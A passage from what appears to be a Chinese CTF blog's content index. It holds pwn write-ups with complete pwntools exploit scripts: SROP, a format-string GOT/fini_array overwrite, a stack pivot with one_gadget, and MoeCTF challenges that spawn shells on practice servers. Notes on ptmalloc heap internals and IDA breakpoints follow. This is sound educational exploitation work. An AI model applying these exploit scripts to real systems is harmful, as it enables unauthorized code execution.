sigcontext。然后，内核将这个 sigcontext 压入栈中，为执行信号处理函数做准备。\n攻击者伪造上下文：攻击者利用栈溢出漏洞，在程序接收信号之前，就向栈中写入一个伪造的 sigcontext 结构体。这个伪造的结构体中包含了攻击者想要设置的所有寄存器值。例如，你可以把 rip 设置为 execve 的地址，把 rdi 设置为 /bin/sh 字符串的地址。\n触发 sigreturn 系统调用：攻击者通过构造 ROP 链，使程序执行流跳转到一个能够执行 sigreturn 系统调用的 gadget。sigreturn 是一个特殊的系统调用，它的功能就是从栈中读取 sigcontext 结构体，并恢复寄存器状态。攻击者通常会找到一个 mov rax, 0xf; syscall; 这样的 gadget，其中 0xf 是 sigreturn 系统调用的编号。\n内核恢复上下文（步骤 ③）：当 syscall 执行后，内核会发现 rax 的值为 0xf，便会执行 sigreturn。正如你所说，内核在执行这一步时不会去校验栈上数据的合法性。它会盲目地信任栈上的数据，从栈顶读取我们伪造的 sigcontext 结构体，并用里面的值来恢复所有的寄存器。\n劫持程序执行流（步骤 ④）：由于我们已经将伪造的 sigcontext 中的 rip 设置为 execve 的地址，rdi 设置为 /bin/sh 的地址，程序恢复寄存器后，会立即跳转到 execve 函数执行，并以 /bin/sh 作为参数，最终获得一个 Shell。\n\n脚本from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] p = process(&#x27;./ciscn_s_3&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,29591)pop_rdi_ret = 0x4005a3syscall = 0x400501vul_addr = 0x4004edret_addr = 0x4003a9vul_addr = 0x4004edpayload = b&#x27;a&#x27; * 0x10 + p64(vul_addr)p.send(payload)#sys_write 是 vuln 函数体的一部分，它在函数返回之前就已经执行了。#sys_write会输出写入 buf 的 16 个 a，以及紧随其后的栈上 32 个字节的内容。这 32 个字节就包含了被你覆盖的返回地址。p.recv(0x20)stack_addr = u64(p.recv(8))print(hex(stack_addr))buf_addr = stack_addr-0x118#buf_addr = stack_addr-0x148gdb.attach(p)payload = p64(ret_addr) + b&#x27;/bin/sh\\00&#x27;payload += p64(0x4004e2) # rax=0x3bpayload += p64(0x40059a) # rdx = 0payload += p64(0) + p64(1) # rbx = 0, rbp = 1payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addrpayload += p64(0x400580)payload += p64(0) * 7\t\tpayload += p64(pop_rdi_ret) + p64(buf_addr + 8) # rdi = &amp;&#x27;/bin/sh\\0&#x27;payload += p64(syscall)#payload += p64(vul_addr)&#x27;&#x27;&#x27;sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = buf_addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = b&#x27;/bin/sh\\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe)&#x27;&#x27;&#x27;p.send(payload)p.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","gdb","csu","SROP"]},{"title":"ciscn_2019_sw_1","url":"/2025/07/22/ciscn-2019-sw-1/","content":"\n\n\n存在system函数，不需要泄露libc的地址\n直接把printf的got表地址覆盖为system函数的地址，然后传递参数为“&#x2F;bin&#x2F;sh”即可\n而且偏移是4\n但是该格式化字符串漏洞只被执行了一次，无法实现操作\n所以要修改收尾函数的地址以实现对格式化字符串漏洞的多次调用\n用readelf去找fini_array的地址\n\n脚本\nfrom pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16)&amp;0xffffsys_l=sys&amp;0xffffmain_h=(main&gt;&gt;16)&amp;0xffffmain_l=main&amp;0xffffpayload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%c的意思是打印n个字符payload+=b&quot;%5$hn&quot;payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;payload += b&#x27;\\x00&#x27;p.sendlineafter(b&quot;name?\\n&quot;,payload)payload=b&quot;/bin/sh&quot;p.sendlineafter(b&quot;name?\\n&quot;,payload)p.interactive()\n\n\n\n\n\n\n\n注意\n四个写入的数是递增的\n如何取高 16 位\n\n地址右移 16 位：system_plt &gt;&gt; 16\n\n把高 16 位“移到”最低位\n\n对于 0x080483d0：\n0x080483d0 &gt;&gt; 16  = 0x0804\n\n\n为什么还要 &amp; 0xffff？\n\n因为高 16 位虽然已经移到低位了，但 Python 整数没有“溢出”概念。\n为了确保最终结果只保留低 16 位（即最大不超过 0xffff），就用掩码 0xffff 取最低 16 位。\n\n\n\nb&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27;\n\n这里的含义是：\n\n这串字符串拼接后是啥样？举个例子，假设 xxx &#x3D; 100，拼接结果是：\n\nb&#x27;%100c%4$hn&#x27;\n\n\n这在格式化字符串里的意思%100c ：向输出缓冲区写入 100个空格字符，使得“已经输出字符数”加100。\n\n%4$hn ：把当前的输出字符数（现在应该是前面已有字符数 + 100）写入 第4个参数指向的地址，写入2字节。\n为什么不用 %n 直接写 4 字节？（两个字节用hn,四字节用n）\n理论上可以直接用 %n 一次写完整 4 字节（一个 int），但是：\n1️⃣ 数字范围的问题\n\n如果你想写的数是：\n复制编辑0x08048534\n\n那就是：134513204（十进制），而格式化字符串里的输出字符数必须刚好是这个数才能写出来。\n\n你需要输出 134,513,204 个字符才能让 %n 写出这个数……显然不现实，程序很可能崩溃或超时。\n\n\nfini.array原理🛡️ 1️⃣ RELRO 与各段的可写性\nELF 程序里有这几个关键的表&#x2F;段：\n\n\n\n段&#x2F;表\n正常作用\n为什么能写\nRELRO保护后的变化\n\n\n\n.got.plt\n存储动态链接函数的真实地址（lazy binding后）\nlazy binding 需要写入真实地址\nNO RELRO 时可写，PARTIAL RELRO 也可写，FULL RELRO 时不可写\n\n\n.init_array\n程序启动时调用的函数数组\n存函数指针\nNO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写\n\n\n.fini_array\n程序退出时调用的函数数组\n存函数指针\nNO RELRO 时可写，PARTIAL&#x2F;FULL 时不可写\n\n\n✨✅ .fini_array 存的是退出时要调用的函数指针。✅ 利用时先把 .fini_array=main，退出时重启 main，给你多一次利用机会。✅ 通常 .fini_array 只有一个指针的位置，只能写一个。\n🔁 为什么 .fini_array 能帮忙\n因为： 1️⃣ 程序退出时，libc 会主动去遍历 .fini_array，执行里面的函数指针。 2️⃣ 默认 .fini_array[0] 指向某个收尾函数。 3️⃣ 如果你把 .fini_array[0] 改成 main 的地址，那程序在退出时就会再一次调用 main，相当于重启了程序。\n收尾函数、是程序退出（或结束）前，操作系统或运行时环境会调用这些函数来做善后工作。\n流程大致是：\nmain 函数执行 → main 返回 → 运行时开始调用“收尾函数” → 资源释放完毕 → 程序完全退出\n\nsendlineafter() vs sendafter() 的区别\n\n\n函数\n行为\n是否自动加 \\n\n适用场景\n\n\n\nsendlineafter()\n等待特定字符串出现后发送数据，自动在末尾加 \\n（换行符）\n✅ 是\n适用于需要换行符的交互（如 scanf、gets、fgets）\n\n\nsendafter()\n等待特定字符串出现后发送数据，不自动加 \\n\n❌ 否\n适用于不需要换行符的交互（如 read、recv）\n\n\n在这里我们是用scanf读取数据，它在读取到&#x2F;n时才会停止，所以要用sendlineafter()\n","categories":["exercise_pwn"],"tags":["PWN","fini_array","分字节"]},{"title":"MoeCTF 2025","url":"/2025/08/17/MoeCTF-2025/","content":"100find it（fd）\ndup回赋值这个文件描述符1的功能，所以在close(1)之后只能通过dup(1)复制的值3来作为输出到终端的文件描述符，会产生新的文件描述符的只有open和dup等函数\nwrite和read是调用他\n所以接下来，open()函数要产生新的小的文件描述符来指定文件位置\n也就是1\n所以脚本\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./fd&quot;)p=remote(&quot;192.168.145.1&quot;,20880)sh_shellcode = asm(shellcraft.sh())p.recvuntil(b&quot;I&#x27;ve hidden the fd of stdout. Can you find it?&quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;You are right.What would you like to see?&quot;)p.sendline(b&quot;flag&quot;)p.recvuntil(b&quot;What is its fd?&quot;)p.sendline(b&quot;1&quot;)p.interactive()\n\n\n\n\n\n认识libc\n\n接收printf的地址，用来泄露libc地址\n但是查看ROP命令查看elf的pop|ret发现不够，所以用libc文件的\n\n基址加上偏移就可以了，所以可以正确放置参数\n构造后门函数\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&quot;./libc.so.6&quot;)elf = ELF(&quot;./libc&quot;)#p=process(&quot;./libc&quot;)p = remote(&quot;192.168.145.1&quot;, 26565)p.recvuntil(&quot;printf&#x27;: 0x&quot;)printf_addr_str = p.recvline().strip()printf = int(printf_addr_str, 16)log.info(&quot;Leaked printf address: &quot; + hex(printf))libc_base = printf - libc.symbols[&quot;printf&quot;]log.success(&quot;Libc base: &quot; + hex(libc_base))rdi=libc_base+0x000000000002a3e5system=libc_base+libc.symbols[&quot;system&quot;]bin=libc_base+0x1d8678p.recvuntil(b&quot;&gt;&quot;)payload = b&quot;A&quot; *72payload+=p64(rdi)+p64(bin)+p64(0x40101a)+p64(system)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\n150ezpivot栈迁移\n注意要用ret*0x100把栈地址抬高\n脚本\n#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-19Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./ezpivot&quot;url = &#x27;127.0.0.1:33113&#x27;gdbscript = &#x27;&#x27;&#x27;  b * 0x000000000040130B  b * 0x000000000040133E&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)desc = 0x0000000000404060binsh_addr = 0x404880pop_rdi = 0x0000000000401219leave_ret = 0x000000000040133Eret = 0x000000000040133Fsystem_plt = elf.plt[&#x27;system&#x27;]system_addr = 0x000000000401230p.sendlineafter(&quot;length of your introduction.\\n&quot; , b&#x27;-1&#x27;)payload = p64(ret) * 0x100 +  p64(pop_rdi) + p64(0x404880) + p64(ret) + p64(system_addr) + b&quot;/bin/sh\\x00&quot;p.sendline(payload)payload = b&#x27;a&#x27; * 0xc + p64(desc - 0x8) + p64(leave_ret)p.sendlineafter(&quot;Now, please tell us your phone number:\\n&quot; , payload)p.interactive()\n\n\n\n\n\nfmt找到两个参数的位置泄露出来\n脚本\n#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-09Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./pwn4&quot;url = &#x27;127.0.0.1:39821&#x27;gdbscript = &#x27;&#x27;&#x27;  b * $rebase(0x0000000000001485)  b * $rebase(0x00000000000014C4)&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)payload = b&#x27;%7$s---%10$p----&#x27;p.sendlineafter(&quot;Hey there, little one, what&#x27;s your name?&quot; , payload)p.recvuntil(&quot;Nice to meet you,&quot;)str1 = p.recvuntil(&quot;---&quot; , drop=True)str2 = p.recvuntil(&quot;---&quot; , drop=True).decode()str2 = bytes.fromhex(str2[2:])[::-1].decode(&quot;utf-8&quot;)print(&quot;=======1111&quot; , str1)print(&quot;=======2222&quot; , str2)p.sendlineafter(&quot;I buried two treasures on the stack.Can you find them?\\n&quot; , str2)p.sendlineafter(&quot;Yeah,another one?&quot; , str1)p.interactive()\n\n","categories":["WP"],"tags":["WP"]},{"title":"gyctf_2020_borrowstack","url":"/2025/07/29/gyctf-2020-borrowstack/","content":"题目\n\n\n思路：\nbank是bss段上的，栈空间不足,把泄露libc的东西放在bank上，通过buf跳转到bank泄露libc去找到libc基址\n然后加上对应libc的one_gadget偏移，跳转过去执行ong_gadgat就可以了\n脚本from pwn import *from LibcSearcher import *#p=process(&quot;./gyctf_2020_borrowstack&quot;)p=remote(&quot;node5.buuoj.cn&quot;,27049)elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)bank=0x0000000000601080leave=0x400699rdi=0x0400703ret=0x4004c9puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main=0x400626payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)p.recvuntil(b&quot;want&quot;)p.send(payload1)p.recvuntil(b&quot;now!&quot;)payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.send(payload2)a=p.recvline()puts= u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)one=libc_base+0x4526apayload=b&#x27;a&#x27;*0x68+p64(one)p.sendline(payload)p.interactive()\n\n\n\n\n\n收获p64(ret)*0x20原因当 main 函数再次被执行时（因为你的 ROP 链最后跳转到了 main 函数的地址）：\n\n程序会为新的 main 函数调用重新分配一个栈帧。\n\n在这个新的栈帧中，会再次为局部变量 buf[96] 分配空间。\n\n\n为什么“临时变量的空间会覆盖到 GOT 表”？\n这里就是关键点。在 64 位程序中，栈是向下增长的（从高地址向低地址）。\n\nGOT 表通常在程序的低地址区域。 （例如：0x0601018）\nbank 变量在 .bss 段，通常地址比 GOT 表高。 （例如：0x0601080）\n栈会向下增长。 当 main 函数再次被调用，并且它在堆栈上分配 buf 等局部变量时，这些变量会占用 rsp 向下增长的内存空间。\n\n现在想象一下：\n\n你的栈迁移，把 rsp 设置到了 bank 处（例如 0x0601080）。\n你用 p64(ret)*20 把你的 ROP 链推到了 bank + 160 (例如 0x0601120)。\n你的 ROP 链执行，泄漏 puts 地址。\n然后，你的 ROP 链最后执行 p64(main)，导致程序跳转回 main 函数的开头。\n当 main 函数再次执行时，它会在栈上重新分配空间。 此时，新的栈帧可能会从 rsp 的当前位置（即 0x0601120，也就是你的 ROP 链最后执行完的位置）开始向下（向低地址）增长。\n如果 main 函数分配的局部变量（例如 buf[96]）的新空间，在栈向下增长的过程中，恰好“覆盖”到了 GOT 表所在的内存区域（例如 0x0601018），那么 GOT 表的地址就会被这些局部变量的垃圾数据所破坏。\n\np64(ret)*20 的作用\n所以，p64(ret)*20 在这里的另一个重要作用就是：\n\n它将你的伪造栈帧（即你写入 bank 的 ROP 链）向高地址方向推得更远。\n这样，当 main 函数再次被调用时，它会从你伪造栈的末尾（bank + 160 + ROP 链长度）开始向下分配新的栈帧。\n通过把你的伪造栈（和 rsp 的位置）设置在足够高的地址，可以确保 main 函数再次分配的局部变量空间（栈向下增长的部分）不会侵犯到位于低地址的 GOT 表。\n\n用图示来说明：\n没有 p64(ret)\\*20 的风险：\n高地址...0x0601080 &lt;-- bank (rsp 迁移到这里)| pop_rdi || puts_got|  &lt;-- ROP链| puts_plt|| main    |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它可能从 0x0601080 附近向下分配新的 buf 空间，这个 buf 空间可能直接覆盖到 0x0601018 处的 puts_got。\n\n有了 p64(ret)\\*20 的好处：\n高地址...0x0601120 &lt;-- bank + 160 (rsp 最终会到这里)| pop_rdi || puts_got|  &lt;-- ROP链| puts_plt|| main    |...0x0601080 &lt;-- bank (rsp 最初迁移到这里，p64(ret)*20 填充)| ret     || ...     || ret     |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它会从 0x0601120 附近向下分配新的 buf 空间。由于 0x0601120 足够高，向下分配的 buf 空间不会到达 0x0601018 的 puts_got。GOT表因此被保护了。\n\n所以，这段解释指的是：p64(ret)\\*20 能够将你的 ROP 链的“起点”抬高，从而避免当程序再次回到 main 函数并重新分配栈空间时，main 函数的局部变量（如 buf）在栈向下增长时，其空间与 GOT 表发生重叠，进而破坏 GOT 表。\n这是一种非常常见的，也是非常重要的防御性策略，确保了后续攻击（例如获取 Shell）的可靠性，因为这些攻击通常需要一个完好无损的 GOT 表来解析函数地址。\n大小1.可以从一个小数开始尝试（推荐）\n一般情况下20就够了\n\n\n\n不能太大， read(0, &amp;bank, 0x100uLL) 写入的。这个 read 函数最多只能读取 0x100 (256) 字节。\n\n你的 payload 长度是有限制的。\np64(ret)*N 占据的字节数是 N * 8。\n你的核心 ROP 链 (p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)) 本身也需要空间。\np64(pop_rdi): 8 字节\np64(puts_got): 8 字节\np64(puts_plt): 8 字节\np64(main): 8 字节\n核心 ROP 链共 4 * 8 = 32 字节。\n\n\n\n如果 N 过大，例如 N=100，那么 p64(ret)*100 就需要 100 * 8 = 800 字节。这已经远远超过了 read 函数能读取的最大 0x100 (256) 字节。\none_gadget和LibcSearcherone_gadget 是一个命令行工具，它用于分析 libc 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。\n与传统的 system(&quot;/bin/sh&quot;) 方法相比，one_gadget 通常更简洁，因为它只需要一个地址就能获取 shell，而不需要 pop_rdi gadget、&quot;/bin/sh&quot; 字符串的地址和 system 函数的地址。 此外，one_gadget 通常对环境（包括栈对齐）的要求更宽松。\n用法和shellcode一样\n找到位置即可ibc\n把泄露出来的函数地址在libc网站匹配\n\n之后下载匹配的的libc版本\n用命令\none_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so\n\n\n找到合适的偏移量即可（地址下面是它要满足的条件）\nLibcSearcher 匹配的版本是它自己数据库中的版本，而不是你本地计算机上 /lib/x86_64-linux-gnu/libc.so.6 这样的文件。\nsystem=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)\n\n是用它LibcSearcher匹配的版本，而one_gadget是用我们匹配下载的libc文件去实际计算的，更准确\nsystem(&quot;/bin/sh&quot;) 的失败：\n\nsystem(&quot;/bin/sh&quot;) 方法需要计算 system 函数的地址 (libc_base + libc.dump(&#39;system&#39;)) 和 &quot;/bin/sh&quot; 字符串的地址 (libc_base + libc.dump(&#39;str_bin_sh&#39;))。\n\n如果这种方法失败，最核心的原因是 LibcSearcher 为你选定的那个 libc 版本（例如 libc6_2.23-0ubuntu10_amd64），虽然其 puts 偏移和 one_gadget 的特定偏移与远程服务器相符，但其内部记录的 system 函数和 &quot;/bin/sh&quot; 字符串的相对偏移量，与远程服务器实际 libc 中的这两个偏移量不一致**。\n\nlibc 版本号（如 2.23）可能相同，但不同的发行版或编译选项（如 ubuntu10 vs ubuntu11，或不同的构建日期）会导致内部函数和字符串的具体相对位置存在细微差异。即使 puts 和某个 one_gadget 的偏移恰好相同，system 或 &quot;/bin/sh&quot; 的偏移可能就不同了。\n\n当你用错误的偏移量计算出 system 和 &quot;/bin/sh&quot; 的地址并尝试跳转时，程序会因为 RIP 指向无效地址或 system 函数接收到无效参数而崩溃（dumped core）。\n\n\n","categories":["exercise_pwn"],"tags":["PWN","one_gadget","栈迁移"]},{"title":"heap","url":"/2025/08/24/heap/","content":"堆管理器ptmalloc程序运行时堆提供动态分布的内存，从而允许程序申请大小未知的内存，堆由低地址向高地址方向增长，这和栈是相反的（栈是由高地\n址向低地址方向生长）\n每个系统都有自己的堆管理器，不同平台的堆管理器是不一样的，比如Windows、Linux、Mac的处理机制不一样，用户请求堆块和释放堆块的流程也不一样。\n堆利用就是针对堆管理器的一种利用思路。它就像是中介，为了避免系统与用户频繁交互（因为和操作系统交互非常耗时），就有了堆管理器。实际上，用户平时申请（malloc）和释放（free）堆块的时候，是和堆管理器直接接触的。\nptmalloc基本功能主要负责完成用户的两个需求：malloc（申请堆块）和free（释放堆块）\n在ptmalloc堆管理器中，内核一般会预先分配一块很大的连续的内存，然后让堆管理器通过某种算法管理这块内存，只有当出现堆空间不足的情况时，ptmalloc堆管理器才会再次与操作系统进行交互，通过系统调用申请内存\n释放堆块的时候也是一样，ptmalloc堆管理器需要管理用户释放的堆块，会通过一系列的bin进行管。bin在ptmalloc中用来保存没有使用的chunk（释放之后的chunk）。根据需求的不同，bin在数据结构上表现为单向链表或者双向循环链表。而且用户请求堆块的时候会优先来自这些释放的堆块\nmalloc和freemalloc\n空间不够 &gt;返回null\n参数为0  &gt;返回一个最小的chunk\n参数为负&gt;申请有个很大的空间（一般不会成功，会返回null）\nfree\n参数为null&gt; 无影响\n参数指向的地方已经被释放时&gt; 除非被禁用（使用 mallopt），否则当释放非常大的内存空间时，将尽可能自动触发将未使用的内存返还给系统的操作，从而减小程序占用。\n内存分配背后的系统调用ptmalloc通过brk&#x2F;sbrk和mmap&#x2F;munmap这两组系统调用实现交互\n\nbrk&#x2F;sbrk\n对于堆的操作，Linux操作系统提供了brk函数，glibc库提供了sbrk函数。我们可以通过增加brk的大小来向操作系统申请内存。\n初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。\n不开启ASLR保护时，start_brk和brk会指向data&#x2F;bss段的结尾。\n开启ASLR保护时，start_brk和brk也会指向同一位置，即在data&#x2F;bss段结尾后的随机偏移处。\n现代操作系统每次重启时都会开启ASLR，所以堆的起始地址也是随机的\nbrk():  brk() 函数接受一个参数，即新的 brk 指针的 绝对地址。\n可以将 brk 指针设置到任何你想要的合法位置，通常是向上移动以申请更多内存。\n它的返回值为 0 表示成功，-1 表示失败。\n这个函数提供的是 设置 功能。\nsbrk(): * sbrk() 函数接受一个 增量 参数（increment）。\n它将当前的 brk 指针 向前或向后移动 指定的字节数。\n它返回移动前的 brk 指针的地址。如果返回 (void*)-1，则表示失败。\n这个函数提供的是 增量 功能。\n当使用 brk() 或 sbrk() 申请内存时，实际上是移动了数据段的末尾（brk 指针），从而获得更大的堆空间。\nmmap&#x2F;munmap\nmalloc会使用mmap来映射数据段，内核会为你分配一块物理内存，并将其内容初始化为 0，且mmap 默认创建的是私有映射。在这种模式下，被映射的内存区域属于调用它的进程，即使这个区域是文件映射，该进程对它的修改也不会反映到原文件中，也不会影响到其他同样映射了此文件的进程。\nmunmap与mmap对应，其作用是释放申请的内存\n堆相关的数据结构malloc_chunk_6malloc 分配的内存被称为 chunk，它们在被释放后不会立即归还给系统，而是进入以双向链表形式组织的 bin*中。\n在malloc_chunk的定义中，共有6个字段，即prev_size、size、fd、bk、fd_nextsize、bk_nextsize。\nprev_size和size是两个size_t字段，而fd&#x2F;bk、fd_nextsize&#x2F;bk_nextsize都是指针字段，实际上记录了两个双向链表。\n\nprev_size存储前一个 chunk 的大小\n在 malloc_chunk结构体中，prev_size 字段位于 size&#96;字段之前\n当前一个物理相邻的chunk是空闲的（free）：\nptmalloc 库可以通过这个值，快速找到前一个空闲 chunk 的起始位置，从而将两个空闲 chunk 合并成一个更大的空闲 chunk，避免内存碎片\n当前一个物理相邻的chunk正在使用（in use）：\n前一个 chunk 的尾部是用户数据\n那么，你当前 chunk 的prev_size 字段，其实位于前一个 chunk 的用户数据区内部。\n此时，ptmalloc 知道前一个 chunk 是被占用的，所以它不会去读取 prev_size 这个字段。因此，这个字段的空间可以被前一个 chunk 的用户数据所占用（空间复用）\n\n\nsize存储着当前chunk的大小，是2＊SIZE_SZ的整数倍\n在32位的系统中size是8的整数倍，64位系统中是16的整数倍\n用户程序申请的大小都会向上取整，比如在32位程序中，用户申请的大小为0x14，那么向上取整后为0x18。但实际上，在分配的时候，因为空间复用，所以分配0x14字节的chunk的时候，结果会和预想的不一样\n把size以二进制写出来会发现后三位都是0，所以将最低的三位用于存储三个标志位，分别是A|M|P，从高位到低位，\n其对应的解释如下：\nA (NON_MAIN_ARENA):\nptmalloc 支持多线程,每个线程可以有自己的内存池,这被称为 arena,标志位表示是不是主arena。\n如果 A 是 1 &gt; 这个 chunk 来自一个非主 arena\n如果 A 是 0 &gt; 这个 chunk 来自主 arena\nM (IS_MMAPED):\n表示当前 chunk 是通过 mmap 分配的，还是通过 brk 从主堆中分配的\nM 是 1  &gt; 这个 chunk通过 mmap 系统调用获得的,当它被释放时，ptmalloc 不会把它放入空闲链表（bin），而是直接调用 munmap 将其归还给操作系统\nM 是 0  &gt; 这个 chunk是通过 brk() 从主堆分配的 ,当它被释放时，ptmalloc 会将其放入对应的 bin 中\nP (PREV_INUSE):\n表示前一个物理相邻的 chunk 是否正在使用中\n P 是 1 &gt; 说明前一个 chunk 正在被占用，ptmalloc 在释放当前 chunk 时，就不需要检查和合并前一个 chunk。\nP 是 0 &gt; 说明前一个 chunk 是空闲的。ptmalloc 在释放当前 chunk 时，会去查看前一个 chunk，并尝试将两个空闲的 chunk 合并成一个更大的块，从而避免内存碎片\neg:\n0x71，0x71&#x3D;&#x3D;0x70|0b001，表示这个chunk的大小为0x70，对应的三个标志位为：A&#x3D;0，M&#x3D;0，P&#x3D;1，即这个chunk属于主线程，不是由mmap系统调用分配，前一个物理相邻的chunk在使用中。\n❑0x105，0x105&#x3D;&#x3D;0x100|0b101，表示这个chunk的大小为0x100，对应的三个标志位为：A&#x3D;1，M&#x3D;0，P&#x3D;1，即这个chunk不属于主线程，由其他线程分配，不是由mmap系统调用分配，前一个物理相邻的chunk在使用中。\n想象一下 arena 是一个内存分配的工厂。每个工厂都有自己的原材料（堆空间）和一套管理流程。\n主 arena：每个进程都有且只有一个主 arena。它使用进程的主堆（main heap，通过 brk() 扩展的数据段）作为原材料。所有线程都可以从主 arena 申请内存。\n非主 arena：在多线程环境中，如果多个线程同时请求内存，为了避免锁竞争，ptmalloc 会为某些线程创建新的 arena。这些新的 arena 不使用主堆，而是通过 mmap() 从操作系统获取独立的堆空间来作为自己的原材料。\n让我们用一个简化的流程来描述 chunk 和 arena 的关系:\n线程 A 调用 malloc() 请求 100 字节内存。\nptmalloc 检查线程 A 是否有自己的 arena。如果这是第一个线程，它会使用主 arena。\n主 arena 检查自己的空闲链表（bin）。如果没有合适的chunk，它会通过 brk() 扩展自己的主堆，然后从新空间中切出 100 字节的chunk，并返回给线程 A。\n线程 B 同时调用 malloc() 请求 200 字节内存。\n如果此时主 arena 被线程 A 锁住，ptmalloc 会为线程 B 创建一个新的 arena。\n这个新 arena 通过 mmap() 获得自己的堆空间。然后从这块新空间中分配一个 200 字节的chunk，并返回给线程 B。\n总而言之，arena 就像一个独立的内存管理单元，它拥有和管理自己的堆空间，并负责分配和回收 chunk。chunk 则是 arena 管理下的最小内存单元。\nfd&#x2F;bk（forward&#x2F;backward）当chunk处于分配状态（使用状态）的时候，从fd这个字段开始是用户的数据，所以如果用户程序分配的堆块大小是0x20，那么实际的开销是0x20+0x10（64位程序），多余的0x10是glibc为了维护所有的chunk而产生的开销。此时fd&#x2F;bk不使用，空间被用户数据复用\n如果一个chunk处于未使用状态，那么fd&#x2F;bk就会记录相应的链表信息。当一个 chunk 被释放后，ptmalloc 会将它放入相应的空闲链表bin\nfd 指针会指向链表中的下一个空闲 chunk，先进入链表\nbk 指针会指向链表中的上一个空闲 chunk，后进入链表\nfd_nextsize&#x2F;bk_nextsizelarge_bin中存储着不同大小的chunk\nfd_nextsize (forward next size)：指向下一个尺寸更大的空闲 chunk\nbk_nextsize (backward next size)：指向上一个尺寸更小的空闲 chunk\n","categories":["pwn_study"],"tags":["heap"]},{"title":"ida使用+动调","url":"/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","content":"ida动态调试断点一般打的都是软件断点\n硬件断点的设法：打好断点后\n\n打开找到刚才打下的断点后右键Edit编辑勾选Hardware\n差别：\n\n1. 实现原理：\n\n软件断点：\n软件断点是通过修改程序指令来实现的。在代码中插入一个特定的中断指令（例如，在x86架构中是INT 3指令）。\n调试器会记录被替换的原始指令，并在程序继续执行时恢复它。\n\n\n硬件断点：\n硬件断点不需要修改程序代码。\n\n\n\n2. 资源限制：\n\n软件断点：\n软件断点在数量上没有严格的限制，可以在程序中的任意位置设置。\n\n\n硬件断点：\nCPU提供的硬件断点寄存器数量有限，因此可以同时设置的硬件断点数量也有限。（最多四个）\n\n\n\n3. 使用场景：\n\n软件断点：\n软件断点适用于大多数调试场景，特别是在需要设置大量断点时。\n\n\n硬件断点：\n硬件断点适用于以下场景：\n调试无法修改代码的程序，例如只读内存中的代码。\n调试需要精确控制执行流程的程序，例如内核代码或驱动程序。\n调试数据断点，就是当某个内存地址被读取或者写入的时候出发断点，这是硬件断点特有的功能。\n\n\n\n\n\n4. 